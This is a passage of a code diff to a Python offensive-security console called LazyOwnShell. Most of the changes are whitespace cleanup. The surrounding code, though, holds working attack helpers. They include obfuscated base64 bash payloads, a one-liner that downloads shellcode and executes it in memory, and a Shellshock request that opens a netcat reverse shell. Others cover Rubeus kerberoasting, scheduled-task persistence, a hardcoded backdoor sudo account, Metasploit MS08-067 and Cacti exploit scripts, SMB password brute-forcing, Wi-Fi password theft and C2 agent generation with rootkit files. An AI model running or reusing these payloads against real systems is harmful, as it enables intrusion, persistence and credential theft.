         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_encoderpayload(self, line):
         """
@@ -8104,13 +8105,13 @@ class LazyOwnShell(cmd2.Cmd):
                 """
 
                 return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()
-            
+
             def apply_obfuscations(cmd):
                 """
                 Generate a list of obfuscated commands based on the given input command.
 
                 This function creates various obfuscated versions of the provided command string.
-                Each obfuscation method applies a different technique to disguise the command, 
+                Each obfuscation method applies a different technique to disguise the command,
                 making it less recognizable to simple static analysis.
 
                 Args:
@@ -8126,7 +8127,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                 Raises:
                     TypeError: If the input `cmd` is not a string.
-                """                
+                """
                 obfuscations = [
                     f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
                     f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
@@ -8152,7 +8153,7 @@ class LazyOwnShell(cmd2.Cmd):
             for obfuscation in obfuscations:
                 print_msg(obfuscation)
                 copy2clip(obfuscation)
-        
+
         except Exception as e:
             print_error(f"An error occurred: {e}")
 
@@ -8374,7 +8375,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         if line.startswith("log"):
             self.cmd("sudo rm sessions/logs/* -rf")
-            return            
+            return
         if line.startswith("nmap"):
             self.cmd("sudo rm sessions/scan* -rf")
             return
@@ -8390,6 +8391,7 @@ class LazyOwnShell(cmd2.Cmd):
             'nmap-bootstrap.xsl',
             'php',
             'payloads.txt',
+            'routes_to_templates.json',
             'sslscan-singleip.sh',
             'tasks.json',
             'temp_uploads',
@@ -8421,7 +8423,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         print_msg(f"Cleaned sessions directory. {RESET}")
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_pyautomate(self, line):
         """
@@ -8462,7 +8464,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error(f"Error executing command for {xml_file}: {e}{RESET}")
         print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_aliass(self, line):
         """
@@ -8605,7 +8607,7 @@ class LazyOwnShell(cmd2.Cmd):
             try:
                 if os.path.isfile(item_path):
                     print_msg("Analizing...")
-            
+
                     rhost = self.params['rhost']
                     if not check_rhost(rhost):
                         return
@@ -8659,27 +8661,27 @@ class LazyOwnShell(cmd2.Cmd):
         """
         path = os.getcwd()
         credentials_file = f'{path}/sessions/credentials.txt'
-        
+
         if not os.path.isfile(credentials_file):
             print_error("Error: Credentials file not found.")
             return
-        
+
         with open(credentials_file, 'r') as file:
             credentials = file.readline().strip()
-        
+
         if not credentials:
             print_error("Error: No credentials found in the file.")
             return
-        
+
         # Split credentials into username and password
         try:
             username, password = credentials.split(':')
         except ValueError:
             print_error("Error: Invalid credentials format in the file.")
             return
-        
+
         rhost = self.params['rhost']
-        
+
         if not check_rhost(rhost):
             print_error("Error: Invalid or undefined rhost.")
             return
@@ -8690,7 +8692,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(password)
         command = f'printf "{password}" | xclip -sel clip'
         self.cmd(command)
-        
+
         print_msg(f"Executing command: {remmina_command}")
         try:
             subprocess.run(remmina_command, shell=True, check=True)
@@ -8783,7 +8785,7 @@ class LazyOwnShell(cmd2.Cmd):
         os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_grisun0w(self, line):
         """
@@ -8842,7 +8844,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if not line:
             line = input('    [!] enter the payload (default; whoami): ') or 'whoami'
-        
+
         utf16_payload = line.encode('utf-16le')
         base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
         final_command = f"powershell /enc {base64_payload}"
@@ -8851,7 +8853,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(final_final_command)
         copy2clip(final_command)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_winbase64payload(self, line):
         """
@@ -8894,9 +8896,9 @@ class LazyOwnShell(cmd2.Cmd):
         if not lhost:
             print_error(f"lhost debe estar seteado. Ej: assign lhost 10.10.10.10")
             return
-        
+
         payload_type = input("    [!] Enter kind payload (1: ps1, 2: wget, 3: Free): ").strip()
-        
+
         if not line and payload_type != "3":
             excluded_extensions = ['.html', '.xml', '.nmap', '.dot', '.png', '.xsl', '.txt', '.json']
             file_list = []
@@ -8904,17 +8906,17 @@ class LazyOwnShell(cmd2.Cmd):
                 for file in files:
                     if not any(file.endswith(ext) for ext in excluded_extensions):
                         file_list.append(os.path.join(root, file))
-            
+
             if not file_list:
                 print_error("No files found in the sessions directory.")
                 return
-    
+
             print_msg("Select a file to download:")
             for idx, file in enumerate(file_list, 1):
                 print_msg(f"  {idx}) {file}")
 
             file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
-            
+
             try:
                 file_choice = int(file_choice)
                 if file_choice < 1 or file_choice > len(file_list):
@@ -8923,7 +8925,7 @@ class LazyOwnShell(cmd2.Cmd):
                 selected_file = file_list[file_choice - 1]
             except ValueError:
                 print_error("Invalid input. Please enter a number.")
-                return        
+                return
         else:
             selected_file = line.strip()
         selected_file = selected_file.replace("sessions/","")
@@ -8977,7 +8979,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Another options to payloads: ")
             print_msg(f"\n\n {payloads} \n\n")
         copy2clip(final_command)
-        
+
         return
 
     @cmd2.with_category(persistence_category)
@@ -9037,7 +9039,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f'printf "{cmdd}" | xclip -sel clip')
 
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_asprevbase64(self, line):
         """
@@ -9115,7 +9117,7 @@ class LazyOwnShell(cmd2.Cmd):
             f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip"
         )
         return
-    
+
     @cmd2.with_category(lateral_movement_category)
     def do_socat(self, line):
         """
@@ -9171,7 +9173,7 @@ class LazyOwnShell(cmd2.Cmd):
                     f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
                 )
                 return
-            
+
     @cmd2.with_category(lateral_movement_category)
     def do_chisel(self, line):
         """
@@ -9255,13 +9257,13 @@ class LazyOwnShell(cmd2.Cmd):
             ).strip()
 
             if choice == "1":
-     
+
                 copy2clip(command1)
-      
+
             elif choice == "2":
-    
+
                 copy2clip(command2)
-     
+
 
             else:
                 print_error("Invalid choice. Please select 1 or 2")
@@ -9331,7 +9333,7 @@ class LazyOwnShell(cmd2.Cmd):
                 return
             TARGET_IP = rhost
             rc_file_path = "/tmp/scan_vulnerabilities.rc"
-            
+
             with open(rc_file_path, "w") as file:
                 file.write(f"""
             # Configurar la IP del objetivo
@@ -9364,12 +9366,12 @@ class LazyOwnShell(cmd2.Cmd):
             exit
             """)
 
-            
+
             subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
 
             if os.path.exists(rc_file_path):
                 os.remove(rc_file_path)
-                
+
             print_msg(f"{YELLOW}Shutdown msfconsole scan {RED} [;,;] {RESET}")
             return
         elif line.startswith("rev"):
@@ -9443,7 +9445,7 @@ class LazyOwnShell(cmd2.Cmd):
                             return
                     print_msg(f"Selected payload: {setpayload}")
 
-                    
+
                 else:
                     print_error("Invalid platform specified")
 
@@ -9483,7 +9485,7 @@ class LazyOwnShell(cmd2.Cmd):
             lport = f"{lport}"
 
             web_root = "sessions"
-            payload = "C:\\xampp\\htdocs\\payload.exe" 
+            payload = "C:\\xampp\\htdocs\\payload.exe"
             args = line.split(" ")
             if not lhost or not lport:
                 print_error(
@@ -9531,7 +9533,7 @@ class LazyOwnShell(cmd2.Cmd):
                     "Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:"
                 )
                 print(ps_script_content)
-   
+
                 cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                 print_msg(
                     f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web"
@@ -9563,10 +9565,10 @@ class LazyOwnShell(cmd2.Cmd):
                     setpayload = "osx/x64/meterpreter/reverse_tcp"
 
             session_id = (
-                "1"  
+                "1"
             )
-            target_subnet = "192.168.100.0" 
-            netmask = "255.255.255.0"  
+            target_subnet = "192.168.100.0"
+            netmask = "255.255.255.0"
             rc_file_path = "/tmp/autoroute.rc"
 
             with open(rc_file_path, "w") as file:
@@ -9648,7 +9650,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"File encrypted: {file_path}.enc")
         except FileNotFoundError:
             print_error(f"File not found: {file_path}")
-    
+
     @cmd2.with_category(exfiltration_category)
     def do_decrypt(self, line):
         """
@@ -9699,7 +9701,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Ejecuta un comando para listar las conexiones SSH activas.
 
-        Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH. 
+        Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH.
 
         Parámetros:
         - line: Parámetro no utilizado en esta función.
@@ -9717,7 +9719,7 @@ class LazyOwnShell(cmd2.Cmd):
         copy2clip(command)
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(post_exploitation_category)
     def do_sessionsshstrace(self, line):
         """
@@ -9740,7 +9742,7 @@ class LazyOwnShell(cmd2.Cmd):
         Notes:
         - Ensure the `sessions` directory exists or is created before running the command.
         - The command redirects both stdout and stderr to the `strace.txt` file.
-        """        
+        """
         if not line:
             print_error("You must pass the PID of the process to attach strace, e.g., sessionsshstrace 666")
             return
@@ -9760,7 +9762,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"An unexpected error occurred: {e}")
 
         path = os.getcwd()
-        file = f"{path}/sessions/strace.txt" 
+        file = f"{path}/sessions/strace.txt"
 
         print_msg("\nSalida de comandos\n")
         salida_strace(file)
@@ -9775,8 +9777,8 @@ class LazyOwnShell(cmd2.Cmd):
         Executes commands defined in a lazyscript file.
 
         This function reads a script file containing commands to be executed
-        sequentially. Each command is executed using the onecmd method of the 
-        cmd.Cmd class. The script file should be located in the 'lazyscripts' 
+        sequentially. Each command is executed using the onecmd method of the
+        cmd.Cmd class. The script file should be located in the 'lazyscripts'
         directory relative to the current working directory.
 
         Args:
@@ -9788,13 +9790,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         """
         script_path = os.path.join(os.getcwd(), 'lazyscripts', line)
-        
+
         if not os.path.isfile(script_path):
             print_error(f"Script file not found: {script_path}")
             return
         with open(script_path, 'r') as file:
             commands = file.readlines()
-        
+
         for command in commands:
             command = command.strip()
             if command:
@@ -9808,10 +9810,10 @@ class LazyOwnShell(cmd2.Cmd):
         a través de los proxies configurados.
 
         Este comando reinicia la aplicación desde el principio utilizando un script
-        bash externo llamado `run`, que se encarga de configurar el entorno 
-        (como activar un entorno virtual) y luego ejecutar la aplicación Python. 
-        El comando `proxychains` se utiliza para asegurar que cualquier comando 
-        ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través 
+        bash externo llamado `run`, que se encarga de configurar el entorno
+        (como activar un entorno virtual) y luego ejecutar la aplicación Python.
+        El comando `proxychains` se utiliza para asegurar que cualquier comando
+        ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través
         de los proxies especificados en la configuración de `proxychains`.
 
         Pasos realizados por esta función:
@@ -9820,7 +9822,7 @@ class LazyOwnShell(cmd2.Cmd):
         3. Sale de la instancia actual de la aplicación para evitar duplicación.
 
         Args:
-            line (str): No se utiliza en este comando, pero se incluye como parte 
+            line (str): No se utiliza en este comando, pero se incluye como parte
                         de la interfaz estándar de `cmd`.
         """
         print_msg("Restarting with proxychains...")
@@ -9832,7 +9834,7 @@ class LazyOwnShell(cmd2.Cmd):
     def do_shellcode(self, line):
         """
         Generates a Python one-liner to execute shellcode from a given URL.
-        
+
         This function:
         1. Retrieves the local host (lhost) from the parameters.
         2. Checks if the local host is valid.
@@ -9855,7 +9857,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         command = f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'
         command1 = f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'
-        print_msg(f"\n{RED}    1 ) {WHITE}" + command) 
+        print_msg(f"\n{RED}    1 ) {WHITE}" + command)
         print_msg(f"\n{RED}    2 ) {WHITE}" + command1)
         choice = input("\nChoice option 1 or 2: ")
         if choice == "1":
@@ -9867,9 +9869,9 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(scanning_category)
     def do_skipfish(self, line):
         """
-        This function executes the web security scanning tool Skipfish 
-        using the provided configuration and parameters. It allows 
-        scanning a specified target (rhost) and saves the results 
+        This function executes the web security scanning tool Skipfish
+        using the provided configuration and parameters. It allows
+        scanning a specified target (rhost) and saves the results
         in a designated output directory.
 
         Parameters:
@@ -9889,13 +9891,13 @@ class LazyOwnShell(cmd2.Cmd):
         - The output of the scan is saved in the directory `sessions/{rhost}/skipfish/`.
         - The wordlist used by Skipfish is specified in `wordlist`.
         """
-        
+
         port = 80
         s = ''
-        
+
         wordlist = '/usr/share/skipfish/dictionaries/complete.wl'
         rhost = self.params['rhost']
-        
+
         if not check_rhost(rhost):
             return
         outputdir = f'sessions/{rhost}/skipfish/'
@@ -9911,20 +9913,20 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(command)
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_createdll(self,line):
         """
         Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.
 
-        This function prompts the user to select between creating a 32-bit DLL, 
-        a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
-        if not, it attempts to install it. The user must provide a filename for the 
-        DLL, which will be created from the `sessions/rev.c` source file. 
-        The function constructs the appropriate command to compile the DLL based on 
-        the user's choice and executes it. If the user selects a 32-bit or 64-bit 
-        compilation, the function also opens the `rev.c` file in a text editor for 
-        modifications before compilation. For option 3, it executes a script to create 
+        This function prompts the user to select between creating a 32-bit DLL,
+        a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed;
+        if not, it attempts to install it. The user must provide a filename for the
+        DLL, which will be created from the `sessions/rev.c` source file.
+        The function constructs the appropriate command to compile the DLL based on
+        the user's choice and executes it. If the user selects a 32-bit or 64-bit
+        compilation, the function also opens the `rev.c` file in a text editor for
+        modifications before compilation. For option 3, it executes a script to create
         a Blazor DLL using the local host (lhost) address to download the necessary payload.
 
         Parameters:
@@ -9933,8 +9935,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         Usage:
         - Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
-        - Ensure that shellcode is created beforehand using 
-        the `lazymsfvenom` or `venom` options 13 or 14 
+        - Ensure that shellcode is created beforehand using
+        the `lazymsfvenom` or `venom` options 13 or 14
         to replace in `sessions/rev.c`.
         """
         lhost = self.params["lhost"]
@@ -9956,7 +9958,7 @@ class LazyOwnShell(cmd2.Cmd):
             command = f"i686-w64-mingw32-gcc -shared -o sessions/{line} sessions/win/rev.c -lws2_32"
         elif choice == "3":
             command = f"./sessions/lin/blazormalware.sh {lhost} {line}"
-        
+
         if choice == "1" or choice == "2":
             cmd = "nano sessions/win/rev.c"
             print_msg(f"Attemp to: {cmd}")
@@ -9997,24 +9999,24 @@ class LazyOwnShell(cmd2.Cmd):
         if line:
             rhost = line.strip()
             print_msg(f"Try... python3 modules/lazyseo.py {rhost}{RESET}")
-            self.cmd(f"python3 modules/lazyseo.py {rhost}")            
+            self.cmd(f"python3 modules/lazyseo.py {rhost}")
         else:
             print_msg(f"Try... python3 modules/lazyseo.py http://{rhost}{RESET}")
             self.cmd(f"python3 modules/lazyseo.py http://{rhost}")
         return
 
     @cmd2.with_category(exploitation_category)
-    def do_padbuster(self, line):   
+    def do_padbuster(self, line):
         """
         Execute the PadBuster command for padding oracle attacks.
 
         This function constructs and executes a PadBuster command to perform
         a padding oracle attack on the specified URL. It requires the user
-        to provide a URL, a cookie with a hash, a plaintext value to compare, 
+        to provide a URL, a cookie with a hash, a plaintext value to compare,
         and a specific byte position to attack.
 
         Parameters:
-        - line (str): The input line containing the cookie, plaintext, and byte 
+        - line (str): The input line containing the cookie, plaintext, and byte
                     position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.
 
         Functionality:
@@ -10039,14 +10041,14 @@ class LazyOwnShell(cmd2.Cmd):
             cookie = args[0].split("=")
             plaintext = args[1]
             number = args[2]
-            command = f"padbuster {url} '{cookie[1]}' {number} -cookie '{args[0]}' -plaintext '{plaintext}'" 
+            command = f"padbuster {url} '{cookie[1]}' {number} -cookie '{args[0]}' -plaintext '{plaintext}'"
             copy2clip(command)
             self.cmd(command)
             return
         else:
             print_error("wrong number of parameters.")
             return
-        
+
     @cmd2.with_category(scanning_category)
     def do_smbattack(self, line):
         """
@@ -10059,7 +10061,7 @@ class LazyOwnShell(cmd2.Cmd):
         4. Optionally conducts a brute-force attack on SMB using the provided password file.
 
         Parameters:
-        line (str): The command line input for the smbattack function, 
+        line (str): The command line input for the smbattack function,
                     though not used directly in this implementation.
 
         Returns:
@@ -10075,7 +10077,7 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
         passwd_file = self.params["wordlist"]
-        file = "sessions/meta.rc" 
+        file = "sessions/meta.rc"
 
         def find_tgts(subnet):
             """
@@ -10086,7 +10088,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             Returns:
                 list: A list of IP addresses where port 445 is open.
-            """            
+            """
             nmap_proc = NmapProcess(subnet, options="-p 445 --open")
             nmap_proc.run()
             nmap_report = NmapParser.parse(nmap_proc.stdout)
@@ -10130,7 +10132,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             Writes:
                 - Exploit configuration for the Conficker vulnerability (MS08-067) to the provided file.
-            """            
+            """
             config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
             config_file.write(f'set RHOST {str(host)}\n')
             config_file.write('set payload windows/meterpreter/reverse_tcp\n')
@@ -10151,7 +10153,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             Writes:
                 - Exploit configuration for SMB brute force (using the psexec module) to the provided file for each password in the passwd_file.
-            """            
+            """
             username = 'Administrator'
             with open(passwd_file) as file:
                 for password in file.readlines():
@@ -10177,11 +10179,11 @@ class LazyOwnShell(cmd2.Cmd):
         copy2clip(command)
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_cacti_exploit(self, line):
         """
-        Automates the exploitation of the Cacti version 1.2.26 vulnerability 
+        Automates the exploitation of the Cacti version 1.2.26 vulnerability
         using the multi/http/cacti_package_import_rce exploit.
 
         This function performs the following actions:
@@ -10191,7 +10193,7 @@ class LazyOwnShell(cmd2.Cmd):
         4. Triggers the payload to obtain a Meterpreter session.
 
         Parameters:
-        line (str): The command line input for the cacti exploit function, 
+        line (str): The command line input for the cacti exploit function,
                     though used directly in this implementation to set password.
 
         Returns:
@@ -10200,7 +10202,7 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-        
+
         if not check_rhost(rhost):
             return
         if not check_lhost(lhost):
@@ -10208,7 +10210,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not check_lport(lport):
             return
         file = "sessions/meta.rc"
-        
+
         def setup_handler(config_file, lhost, lport):
             """
             Sets up a Metasploit multi/handler exploit configuration in the provided config file.
@@ -10249,7 +10251,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             config_file.write('use exploit/multi/http/cacti_package_import_rce\n')
             config_file.write(f'set RHOST {host}\n')
-            config_file.write(f'set LHOST {lhost}\n')            
+            config_file.write(f'set LHOST {lhost}\n')
             config_file.write('set USERNAME admin\n')
             config_file.write(f'set PASSWORD {line}\n')
             config_file.write('exploit -j -z\n')
@@ -10263,13 +10265,13 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
         return
 
-    @cmd2.with_category(credential_access_category)  
+    @cmd2.with_category(credential_access_category)
     def do_smalldic(self, list):
         """
         Handles the creation of temporary files for users and passwords based on a small dictionary.
 
-        This function prompts the user to decide whether to use a small dictionary for generating 
-        user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+        This function prompts the user to decide whether to use a small dictionary for generating
+        user and password lists. If the user agrees, it loads the credentials from a JSON file and
         writes them into temporary files. If the user declines, the process is aborted.
 
         Parameters:
@@ -10277,7 +10279,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
         None
-        """        
+        """
         use_small_dict = input(f"    {CYAN}[?] Do you want to use the small dictionary? (yes/no): ").strip().lower()
 
         if use_small_dict == "yes":
@@ -10285,7 +10287,7 @@ class LazyOwnShell(cmd2.Cmd):
             smalldic = f"{path}/modules/credentials.json"
             with open(smalldic, 'r') as f:
                 data = json.load(f)
-            
+
             print_msg("Create temporary files for users")
             with open('sessions/small_users.txt', 'w') as f:
                 for username in data["usernames"]:
@@ -10301,7 +10303,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_warn("Abort. smalldic")
         return
 
-    @cmd2.with_category(lateral_movement_category)  
+    @cmd2.with_category(lateral_movement_category)
     def do_ngrok(self, line):
         """
         Set up and run ngrok on a specified local port. If ngrok is not installed, it will
@@ -10333,7 +10335,7 @@ class LazyOwnShell(cmd2.Cmd):
             """
             print_msg(install)
             os.system(install)
-            
+
             print_msg("visit https://dashboard.ngrok.com/get-started/your-authtoken to get your token")
             token = input("    [!] Authenticate your ngrok agent with your Token: ")
             install = "ngrok config add-authtoken"
@@ -10351,7 +10353,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
         return
 
-    @cmd2.with_category(lateral_movement_category)  
+    @cmd2.with_category(lateral_movement_category)
     def do_wifipass(self, line):
         """
         This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
@@ -10381,30 +10383,30 @@ class LazyOwnShell(cmd2.Cmd):
         copy2clip(command)
         return
 
-    @cmd2.with_category(exploitation_category)  
+    @cmd2.with_category(exploitation_category)
     def do_shellshock(self, line):
         """
         Executes a Shellshock attack against a target.
 
-        This function constructs and sends a specially crafted HTTP request designed to exploit 
-        the Shellshock vulnerability on a target server. The payload is embedded in the 
-        'User-Agent' header, and when executed, it will open a reverse shell connection to 
+        This function constructs and sends a specially crafted HTTP request designed to exploit
+        the Shellshock vulnerability on a target server. The payload is embedded in the
+        'User-Agent' header, and when executed, it will open a reverse shell connection to
         the attacker's machine.
 
         Parameters:
         - lport: Local port for the reverse shell connection, retrieved from self.params.
         - lhost: Local host for the reverse shell connection, retrieved from self.params.
 
-        The function first validates the local host (lhost) and local port (lport) using 
-        check_lhost() and check_lport(). If either validation fails, the function returns 
+        The function first validates the local host (lhost) and local port (lport) using
+        check_lhost() and check_lport(). If either validation fails, the function returns
         without proceeding.
 
         If the validation passes, the payload is created using the format:
         '() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
         where rhost is the remote target's IP address and lport is the specified local port.
 
-        The function then attempts to send a GET request to the target URL (args.target) 
-        with the crafted payload in the 'User-Agent' header. The server's response is captured 
+        The function then attempts to send a GET request to the target URL (args.target)
+        with the crafted payload in the 'User-Agent' header. The server's response is captured
         and printed using print_msg().
 
         If any error occurs during the request, an error message is displayed using print_error().
@@ -10433,8 +10435,8 @@ class LazyOwnShell(cmd2.Cmd):
                     "User-Agent": payload}
             req = requests.get(url, headers=headers).text
             with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as output_file:
-                output_file.write(req.encode('utf-8'))  
-                temp_file_name = output_file.name  
+                output_file.write(req.encode('utf-8'))
+                temp_file_name = output_file.name
             subprocess.run(['batcat', temp_file_name])
             os.remove(temp_file_name)
         except KeyError as e:
@@ -10503,7 +10505,7 @@ class LazyOwnShell(cmd2.Cmd):
         }
         '''.replace("        ",'').replace("8080",line)
         copy2clip(command)
-        
+
         print_warn(f'Example of use: curl -X POST http://{rhost}:{line}/ -d "Get-Process"')
         return
 
@@ -10511,15 +10513,15 @@ class LazyOwnShell(cmd2.Cmd):
     def do_morse(self,line):
         """Interactive Morse Code Converter.
 
-        This function serves as an interface for converting text to Morse code and vice versa. 
+        This function serves as an interface for converting text to Morse code and vice versa.
         It provides a menu with the following options:
-        
+
         1️⃣  Convert text to Morse code.
         2️⃣  Convert Morse code to text.
         0️⃣  Exit the program.
 
-        When the function is called, it runs an external script (`morse.py`) that handles 
-        the conversion processes. The function also manages keyboard interruptions 
+        When the function is called, it runs an external script (`morse.py`) that handles
+        the conversion processes. The function also manages keyboard interruptions
         gracefully, allowing the user to exit the program cleanly.
 
         Arguments:
@@ -10565,13 +10567,13 @@ class LazyOwnShell(cmd2.Cmd):
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/68.0"
         }
         self.cmd("clear")
-        
+
         try:
             r = requests.get(wayback_url, headers=headers)
             r.raise_for_status()
             results = r.text
-         
-            
+
+
 
             print_msg(f"{GREEN}############ All websites from the WayBack Machine ###########")
 
@@ -10582,7 +10584,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         except requests.exceptions.RequestException as e:
             print_warn(f"Warning: Failed to fetch data from the Wayback Machine. {str(e)}")
-    
+
     @cmd2.with_category(command_and_control_category)
     def do_c2(self, line):
         """Handle C2 server setup and agent compilation.
@@ -10770,7 +10772,7 @@ class LazyOwnShell(cmd2.Cmd):
             payload = f"curl http://{lhost}/r -o r && sh r"
             copy2clip(payload)
             platform = "webassembly"
-            user_agent = user_agent_lin                        
+            user_agent = user_agent_lin
         if not check_lhost(lhost):
             return
 
@@ -10787,13 +10789,13 @@ class LazyOwnShell(cmd2.Cmd):
             content = f.read()
 
         with open(payload_sh, 'r') as f:
-            payload_content = f.read()  
+            payload_content = f.read()
 
         with open(mrhyde, 'r') as f:
             mrhyde_content = f.read()
 
         with open(rootkit_c, 'r') as f:
-            rootkit_content = f.read() 
+            rootkit_content = f.read()
 
         with open(cfiles, 'r') as f:
             content_mon = f.read()
@@ -10856,7 +10858,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         with open(f"sessions/listener_{line}.sh", 'w+') as f:
             f.write(evil_content)
-        
+
         print_msg(f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &")
 
         content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", rhost)
@@ -10870,7 +10872,7 @@ class LazyOwnShell(cmd2.Cmd):
             f.write(contentr)
         #with open(gofile_ws, 'r') as f:
         #    content_ws = f.read()
-            
+
         with open(gofile, 'r') as f:
             content = f.read()
 
@@ -10884,10 +10886,10 @@ class LazyOwnShell(cmd2.Cmd):
             monrevlin_content = f.read()
 
         AES_KEY_hex = AES_KEY.hex()
-        
+
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth).replace('{user_agent_1}', user_agent_1).replace('{user_agent_2}', user_agent_2).replace('{user_agent_3}', user_agent_3).replace('{url_trafic_1}', url_trafic_1).replace('{url_trafic_2}', url_trafic_2).replace('{url_trafic_3}', url_trafic_3)
         #content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
-        
+
         monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
